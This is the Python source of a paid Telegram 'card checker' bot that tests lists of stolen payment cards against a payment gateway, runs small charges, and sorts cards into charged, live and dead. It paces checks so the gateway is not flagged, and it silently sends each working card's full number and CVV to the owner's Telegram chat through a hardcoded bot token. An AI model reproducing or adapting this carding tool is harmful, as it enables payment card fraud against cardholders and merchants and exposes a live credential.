import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from gatet import Tele
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re

# Bot conflict prevention
def clear_bot_conflicts(bot_token):
    """Clear any existing webhooks and conflicts"""
    try:
        print("🔧 Clearing bot conflicts...")

        # Delete webhook to ensure polling works
        webhook_response = requests.post(f"https://api.telegram.org/bot{bot_token}/deleteWebhook", timeout=10)
        if webhook_response.status_code == 200:
            print("✅ Webhook cleared")

        # Get and clear pending updates
        updates_response = requests.get(f"https://api.telegram.org/bot{bot_token}/getUpdates?offset=-1", timeout=10)
        if updates_response.status_code == 200:
            print("✅ Pending updates cleared")

        # Small delay to ensure cleanup
        time.sleep(3)
        print("✅ Bot conflict prevention completed")
        return True

    except Exception as e:
        print(f"⚠️ Conflict cleanup warning: {e}")
        return False

token = "7471320098:AAFozaWdh60lXwHRZC4AfwqhsyD13nSZZH0"

# Clear conflicts before starting bot
clear_bot_conflicts(token)
bot=telebot.TeleBot(token,parse_mode="HTML")

owners = ["1172862169"]

# Dictionary to track user cooldowns for /chk command
user_cooldowns = {}

# Dictionary to track active users who have used the bot
active_users = {}

def track_user_activity(user_id, username, first_name, last_name, command_used):
    """Track user activity for the active users list"""
    user_info = {
        'user_id': str(user_id),
        'username': username or "No Username",
        'first_name': first_name or "N/A",
        'last_name': last_name or "N/A",
        'last_command': command_used,
        'last_seen': time.time(),
        'command_count': active_users.get(str(user_id), {}).get('command_count', 0) + 1
    }
    active_users[str(user_id)] = user_info

# Function to check if the user's ID is in the id.txt file
def is_user_allowed(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip() for id in allowed_ids]  # Clean any extra spaces/newlines
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it with user IDs.")
    return False

def add_user(user_id):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}\n")
        
    try:
        bot.send_message(user_id, "You have been successfully added to the authorized list. You now have access to the bot.")
    except Exception as e:
        print(f"Failed to send DM to {user_id}: {e}")

def remove_user(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                if line.strip() != str(user_id):
                    file.write(line)
        
        try:
            bot.send_message(user_id, "You have been removed from the authorized list. You no longer have access to the bot.")
        except Exception as e:
            print(f"Failed to send DM to {user_id}: {e}")

    except FileNotFoundError:
        print("id.txt file not found. Cannot remove user.")
        
valid_redeem_codes = []

def generate_redeem_code():
    prefix = "BLACK"
    suffix = "NUGGET"
    main_code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    code = f"{prefix}-{main_code}-{suffix}"
    return code

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == '1172862169':
        new_code = generate_redeem_code()
        valid_redeem_codes.append(new_code)
        bot.reply_to(
            message, 
            f"<b>🎉 New Redeem Code 🎉</b>\n\n"
            f"<code>{new_code}</code>\n\n"
            f"<code>/redeem {new_code}</code>\n"
            f"Use this code to redeem your access!",
            parse_mode="HTML"
        )
    else:
        bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")

LOGS_GROUP_CHAT_ID = -4948206902

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    # Track user activity
    track_user_activity(
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name,
        "/redeem"
    )

    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem DRACO-XXXX-XXXX-XXXX-OP")
        return

    if redeem_code in valid_redeem_codes:
        if is_user_allowed(message.chat.id):
            bot.reply_to(message, "You already have access to the bot. Redeeming again is not allowed.")
        else:
            add_user(message.chat.id)
            valid_redeem_codes.remove(redeem_code)
            bot.reply_to(
                message, 
                f"Redeem code {redeem_code} has been successfully redeemed.✅ You now have access to the bot."
            )
            
            # Log the redemption to the logs group
            username = message.from_user.username or "No Username"
            log_message = (
                f"<b>Redeem Code Redeemed</b>\n"
                f"Code: <code>{redeem_code}</code>\n"
                f"By: @{username} (ID: <code>{message.chat.id}</code>)"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message)
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id

    # Track user activity
    track_user_activity(
        user_id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name,
        "/start"
    )

    if is_user_allowed(user_id):
        bot.reply_to(message, "You're authorized! Send the file to see the magic 🪄✨")
    else:
        bot.reply_to(message, """
You Are Not Authorized to Use this Bot

⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
⤿ 1 day - 90rs/3$
★ 7 days - 180rs/6$
★ 1 month - 400rs/18$
★ lifetime - 800rs/20$

Dm @god_forever Tᴏ Bᴜʏ Pʀᴇᴍɪᴜм""")

@bot.message_handler(commands=["help"])
def help_command(message):
    # Track user activity
    track_user_activity(
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name,
        "/help"
    )

    # Check if user is owner to show admin commands
    user_id = str(message.from_user.id)
    is_owner = user_id in owners

    help_text = """🔧 **Card Checker Bot Commands:**

🔹 `/chk <card>` - Check single card
   📝 Format: `card|month|year|cvv`
   🔹 Example: `/chk 4111111111111111|12|25|123`

🔹 `/help` - Show this help message
🔹 `/info` - View your user information

📁 **File Upload:**
Upload a .txt file with cards (one per line)
Format: `4111111111111111|12|25|123`

✨ **Features:**
• Real-time card checking
• Detailed card information (brand, bank, country)
• Individual responses for each card
• 20-second cooldown for /chk (users only)
• Works in private messages and designated group"""

    if is_owner:
        help_text += """

👑 Owner Commands:
• /add <user_id> - Add user to authorized list
• /remove <user_id> - Remove user from authorized list
• /code - Generate redeem code
• /show_auth_users - View authorized users
• /active_users - View users who are using the bot"""

    help_text += "\n\n🤖 Bot By: @god_forever"

    bot.reply_to(message, help_text)

LOGS_GROUP_CHAT_ID = -4948206902 # Replace with your logs group chat ID

@bot.message_handler(commands=["add"])
def add(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_add = message.text.split()[1]  # Get the user ID from the command
            add_user(user_id_to_add)
            bot.reply_to(message, f"User {user_id_to_add} added to the authorized list.")
            
            # Send log to logs group
            log_message = (
                f"<b>🚀 User Added</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
                f"🔗 <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to add.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")

@bot.message_handler(commands=["remove"])
def remove(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            user_id_to_remove = message.text.split()[1]  # Get the user ID from the command
            remove_user(user_id_to_remove)
            bot.reply_to(message, f"User {user_id_to_remove} removed from the authorized list.")
            
            # Send log to logs group
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
                f"🔗 <b>By:</b> @{message.from_user.username or 'No Username'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "Please provide a user ID to remove.")
    else:
        bot.reply_to(message, "You are not authorized to perform this action.")
        
@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = message.chat.id
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Track user activity
    track_user_activity(
        user_id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name,
        "/info"
    )

    # Check user status
    if str(user_id) in owners:
        status = "Owner 👑"
    elif is_user_allowed(user_id):
        status = "Authorised ✅"
    else:
        status = "Not-Authorised ❌"

    # Formatted response
    response = (
        f"🔍 <b>Your Info</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 <b>First Name:</b> {first_name}\n"
        f"👤 <b>Last Name:</b> {last_name}\n"
        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
        f"📛 <b>Username:</b> @{username}\n"
        f"🔗 <b>Profile Link:</b> {profile_link}\n"
        f"📋 <b>Status:</b> {status}"
    )
    
    bot.reply_to(message, response, parse_mode="HTML")
	
def is_bot_stopped():
    return os.path.exists("stop.stop")

def check_cvv_error(response):
    """Check if the response contains CVV/CVC error messages"""
    # Convert response to string for checking
    response_str = str(response).lower()

    cvv_errors = [
        "security code is incorrect",
        "cvc is incorrect",
        "cvv is incorrect",
        "incorrect_cvc",
        "your card's security code is incorrect"
    ]

    return any(error in response_str for error in cvv_errors)


@bot.message_handler(content_types=["document"])
def main(message):
	if not is_user_allowed(message.from_user.id):
		bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
		return

	# Track user activity for bulk checking
	track_user_activity(
		message.from_user.id,
		message.from_user.username,
		message.from_user.first_name,
		message.from_user.last_name,
		"bulk_check"
	)

	# Track user activity for bulk checking
	track_user_activity(
		message.from_user.id,
		message.from_user.username,
		message.from_user.first_name,
		message.from_user.last_name,
		"bulk_check"
	)
	dd = 0
	live = 0
	ch = 0
	total = 0  # Initialize total variable
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	username = message.from_user.username or "N/A"
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

	with open("combo.txt", "wb") as w:
		w.write(ee)

		start_time = time.time()

	try:
		with open("combo.txt", 'r', encoding='utf-8', errors='ignore') as file:
			lino = file.readlines()
			total = len(lino)
			if total > 2001:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚨 Oops! This file contains {total} CCs, which exceeds the 2000 CC limit! ?? Please provide a file with fewer than 500 CCs for smooth processing. 🔥")
				return
				
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @god_forever')
						os.remove('stop.stop')
						return
			
				try:
					data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank'])
				except:
					bank=('N/A')
				try:
					brand=(data['brand'])
				except:
					brand=('N/A')
				try:
					emj=(data['country_flag'])
				except:
					emj=('N/A')
				try:
					cn=(data['country_name'])
				except:
					cn=('N/A')
				try:
					dicr=(data['level'])
				except:
					dicr=('N/A')
				try:
					typ=(data['type'])
				except:
					typ=('N/A')
				try:
					url=(data['bank']['url'])
				except:
					url=('N/A')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• Charged ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• CCN ✅ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {total} ] •", callback_data='x')
				cm6 = types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing
𝒃𝒚 ➜ @god_forever''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
					print(f"DEBUG FILE - Response received: {last}")
					print(f"DEBUG FILE - Response type: {type(last)}")
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
						print(f"DEBUG FILE - Retry response received: {last}")
						print(f"DEBUG FILE - Retry response type: {type(last)}")
					except Exception as e:
						print(e)
						last = "Your card was declined."
						print(f"DEBUG FILE - Fallback response: {last}")
				
				msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV/CVV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲:  @god_forever'''
				print(f"DEBUG - Response received: {last}")
				print(f"DEBUG - Response type: {type(last)}")
				if "requires_action" in last:
					send_owner_notification(msg)  # Silent notification to owner only
					bot.reply_to(message, msg)
					live += 1
				elif "Your card does not support this type of purchase." in last:
					live += 1
					send_owner_notification(msg)  # Silent notification to owner only
					bot.reply_to(message, msg)
				elif check_cvv_error(last):
					live += 1
					# Create CVV error message
					cvv_msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV/CVC Incorrect.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲:  @god_forever'''
					send_owner_notification(cvv_msg)  # Silent notification to owner only
					bot.reply_to(message, cvv_msg)
				elif "succeeded" in last:
					ch += 1
					elapsed_time = time.time() - start_time
					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
					send_owner_notification(msg1)  # Silent notification to owner only
					bot.reply_to(message, msg1)
				else:
					dd += 1
					
				checked_count = ch + live + dd
				if checked_count % 50 == 0:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="Taking a 1-minute break... To Prevent Gate from Dying, Please wait ⏳")
					time.sleep(60)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Resuming the Process, Sorry for the Inconvience")
					
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅

Charged CC : {ch}
CCN : {live}
Dead CC : {dd}
Total : {total}

𝗕𝗢𝗧 𝗕𝗬 ➜ @god_forever''')
		
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
	try:
		bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
	except Exception as e:
		print(f"Callback query error: {e}")
	bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")
	
@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "No authorized users found.")
                return
            
            # Prepare the message with user IDs and usernames
            user_list = "Authorized Users:\n\n"
            for user_id in allowed_ids:
                user_id = user_id.strip()  # Clean any extra spaces/newlines
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "No Username"
                    user_list += f"• {username} (ID: {user_id})\n"
                except Exception as e:
                    user_list += f"• User ID: {user_id} (Username not found)\n"
            
            # Send the list to the owner
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "id.txt file not found. No authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to view the list of authorized users.")

@bot.message_handler(commands=["active_users", "au", "users"])
def show_active_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        if not active_users:
            bot.reply_to(message, "No active users found. Users will appear here after they interact with the bot.")
            return

        # Prepare the message with active user information
        user_list = "<b>🔥 Active Bot Users</b>\n"
        user_list += "━━━━━━━━━━━━━━━━━━━━\n\n"

        # Sort users by last seen time (most recent first)
        sorted_users = sorted(active_users.items(), key=lambda x: x[1]['last_seen'], reverse=True)

        for user_id, user_info in sorted_users:
            username = user_info['username']
            first_name = user_info['first_name']
            last_command = user_info['last_command']
            command_count = user_info['command_count']
            last_seen = user_info['last_seen']

            # Calculate time since last seen
            time_diff = time.time() - last_seen
            if time_diff < 60:
                time_ago = f"{int(time_diff)}s ago"
            elif time_diff < 3600:
                time_ago = f"{int(time_diff/60)}m ago"
            elif time_diff < 86400:
                time_ago = f"{int(time_diff/3600)}h ago"
            else:
                time_ago = f"{int(time_diff/86400)}d ago"

            # Check if user is still authorized
            is_authorized = is_user_allowed(int(user_id))
            status_emoji = "✅" if is_authorized else "❌"

            user_list += f"👤 <b>{first_name}</b> (@{username})\n"
            user_list += f"🆔 <code>{user_id}</code> {status_emoji}\n"
            user_list += f"📊 Commands: {command_count} | Last: {last_command}\n"
            user_list += f"⏰ {time_ago}\n\n"

        user_list += f"<b>Total Active Users:</b> {len(active_users)}"

        # Send the list to the owner
        bot.reply_to(message, user_list, parse_mode="HTML")
    else:
        bot.reply_to(message, "You are not authorized to view the active users list.")

print("DONE ✅")

allowed_group = -4948206902

@bot.message_handler(commands=["chk"])
def chk(message):
    try:
        # Check if user is authorized
        if not is_user_allowed(message.from_user.id):
            bot.reply_to(message, "❌ You are not authorized to use this bot. Contact @god_forever for access.")
            return

        # Allow in private messages or designated group
        if message.chat.type != 'private' and message.chat.id != allowed_group:
            bot.reply_to(message, "This command can only be used in private messages or the designated group.")
            return

        # Track user activity
        track_user_activity(
            message.from_user.id,
            message.from_user.username,
            message.from_user.first_name,
            message.from_user.last_name,
            "/chk"
        )

        # Check cooldown for regular users (not owners)
        user_id = str(message.from_user.id)
        current_time = time.time()

        if user_id not in owners:  # Only apply cooldown to non-owners
            if user_id in user_cooldowns:
                time_since_last_use = current_time - user_cooldowns[user_id]
                if time_since_last_use < 20:  # 20 second cooldown
                    remaining_time = 20 - int(time_since_last_use)
                    bot.reply_to(message, f"⏰ Please wait {remaining_time} seconds before using /chk again.")
                    return

            # Update the user's last usage time
            user_cooldowns[user_id] = current_time

        # Extract the card number from the command
        if len(message.text.split()) < 2:
            bot.reply_to(message, """❌ Please provide a card to check.

📝 **Usage:** `/chk 4111111111111111|12|25|123`

📋 **Format:** `card_number|month|year|cvv`
🔹 Example: `/chk 4532123456789012|12|25|123`""", parse_mode="Markdown")
            return

        try:
            cc = message.text.split('/chk ')[1].strip()
            if not cc:
                raise IndexError
        except IndexError:
            bot.reply_to(message, """❌ Please provide a card to check.

📝 **Usage:** `/chk 4111111111111111|12|25|123`

📋 **Format:** `card_number|month|year|cvv`
🔹 Example: `/chk 4532123456789012|12|25|123`""", parse_mode="Markdown")
            return

        # Validate card format
        if '|' not in cc or len(cc.split('|')) != 4:
            bot.reply_to(message, """❌ Invalid card format!

📝 **Correct Format:** `card_number|month|year|cvv`
🔹 Example: `/chk 4532123456789012|12|25|123`

✅ Make sure to include all 4 parts separated by |""", parse_mode="Markdown")
            return

        # Additional validation
        try:
            card_parts = cc.split('|')
            card_number = card_parts[0].strip()
            month = card_parts[1].strip()
            year = card_parts[2].strip()
            cvv = card_parts[3].strip()

            # Basic validation
            if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
                bot.reply_to(message, "❌ Invalid card number! Must be 13-19 digits.", parse_mode="Markdown")
                return

            if not month.isdigit() or int(month) < 1 or int(month) > 12:
                bot.reply_to(message, "❌ Invalid month! Must be 01-12.", parse_mode="Markdown")
                return

            if not year.isdigit() or len(year) != 2:
                bot.reply_to(message, "❌ Invalid year! Must be 2 digits (e.g., 25 for 2025).", parse_mode="Markdown")
                return

            if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
                bot.reply_to(message, "❌ Invalid CVV! Must be 3-4 digits.", parse_mode="Markdown")
                return

        except (ValueError, IndexError) as e:
            bot.reply_to(message, f"❌ Card validation error: {str(e)}", parse_mode="Markdown")
            return
        username = message.from_user.username or "N/A"

        try:
            initial_message = bot.reply_to(message, "🔄 **Checking your card...**\n⏳ Please wait...", parse_mode="Markdown")
        except telebot.apihelper.ApiTelegramException:
            initial_message = bot.send_message(message.chat.id, "🔄 **Checking your card...**\n⏳ Please wait...", parse_mode="Markdown")

        # Get the response from the `Tele` function
        try:
            print(f"DEBUG /chk - Processing card: {cc[:4]}****")
            last = str(Tele(cc))
            print(f"DEBUG /chk - Response received: {last}")
        except Exception as e:
            print(f"Error in Tele function: {e}")
            import traceback
            traceback.print_exc()

            bot.edit_message_text(
                f"❌ **Gateway Error**\n\n"
                f"🔧 The payment gateway is currently unavailable.\n"
                f"⏰ Please try again in a few minutes.\n"
                f"📝 Error: {str(e)}\n\n"
                f"🤖 Bot By: @god_forever",
                chat_id=message.chat.id,
                message_id=initial_message.message_id,
                parse_mode="Markdown"
            )
            return

        # Fetch BIN details
        try:
            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
            if response.status_code == 200:
                data = response.json()  # Parse JSON
            else:
                print(f"Error: Received status code {response.status_code}")
                data = {}
        except Exception as e:
            print(f"Error fetching BIN data: {e}")
            data = {}

        # Extract details with fallback values
        bank = data.get('bank', 'N/A')
        brand = data.get('brand', 'N/A')
        emj = data.get('country_flag', 'N/A')
        cn = data.get('country_name', 'N/A')
        dicr = data.get('level', 'N/A')
        typ = data.get('type', 'N/A')
        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
        
        if "requires_action" in last:
            message_ra = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: {cc} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬??𝐮??𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫??: {cn} {emj}

𝗧𝗶𝗺??: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id)
            send_owner_notification(message_ra)  # Send to owner
        elif check_cvv_error(last):
            message_cvv = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: {cc} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV/CVC Incorrect.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(message_cvv, chat_id=message.chat.id, message_id=initial_message.message_id)
            send_owner_notification(message_cvv)  # Send to owner
        elif "succeeded" in last:
            msg_sec = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id)
            send_owner_notification(msg_sec)  # Send to owner
        else:
            msg_dec = f'''𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
					
𝗖𝗮𝗿𝗱: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Declined.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id)
            
    except Exception as e:
        print(f"Unexpected error in /chk command: {e}")
        import traceback
        traceback.print_exc()

        # Send detailed error message
        error_msg = f"""❌ **Error Processing Card**

🔧 **Issue:** {str(e)}

💡 **Please try:**
• Check card format: `card|month|year|cvv`
• Example: `/chk 4111111111111111|12|25|123`
• Contact @god_forever if issue persists

🤖 Bot By: @god_forever"""

        try:
            bot.reply_to(message, error_msg, parse_mode="Markdown")
        except:
            bot.reply_to(message, "❌ An error occurred. Please check your card format and try again.")
    
    
def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot7471320098:AAFozaWdh60lXwHRZC4AfwqhsyD13nSZZH0/sendMessage"
    data = {'chat_id': -4948206902, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)

def send_owner_notification(msg1):
    """Send silent notification to the owner"""
    url = f"https://api.telegram.org/bot7471320098:AAFozaWdh60lXwHRZC4AfwqhsyD13nSZZH0/sendMessage"
    owner_id = "1172862169"  # Owner ID
    data = {
        'chat_id': owner_id,
        'text': msg1,
        'parse_mode': 'HTML',
        'disable_notification': True  # Silent notification
    }
    try:
        requests.post(url, data=data, timeout=5)
        # No print statements - completely silent
    except:
        # Silent failure - no error messages
        pass

# Removed send_notifications_to_all - using silent owner notifications only
    
# Robust bot startup with conflict handling
def start_bot_safely():
    """Start bot with automatic conflict resolution"""
    max_retries = 3
    retry_delay = 10

    for attempt in range(max_retries):
        try:
            print(f"🚀 Starting bot (attempt {attempt + 1}/{max_retries})...")

            # Clear conflicts before each attempt
            if attempt > 0:
                print(f"⏳ Waiting {retry_delay} seconds before retry...")
                time.sleep(retry_delay)
                clear_bot_conflicts(token)

            # Start polling with error handling
            bot.infinity_polling(
                timeout=20,
                long_polling_timeout=20,
                none_stop=True,
                interval=1
            )
            break

        except telebot.apihelper.ApiTelegramException as e:
            if "409" in str(e) or "Conflict" in str(e):
                print(f"❌ Bot conflict detected (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    print("🔄 Attempting to resolve conflict...")
                    clear_bot_conflicts(token)
                    continue
                else:
                    print("❌ Max retries reached. Please check for other bot instances.")
                    break
            else:
                print(f"❌ Telegram API error: {e}")
                break

        except Exception as e:
            print(f"❌ Unexpected error: {e}")
            if attempt < max_retries - 1:
                print(f"🔄 Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
                continue
            else:
                print("❌ Max retries reached.")
                break

if __name__ == "__main__":
    try:
        print("🤖 Card Checker Bot Starting...")
        print("📡 Initializing bot systems...")
        start_bot_safely()
    except Exception as e:
        print(f"💥 Fatal error: {e}")
        print("🔄 Bot will be restarted by the system service...")
        sys.exit(1)
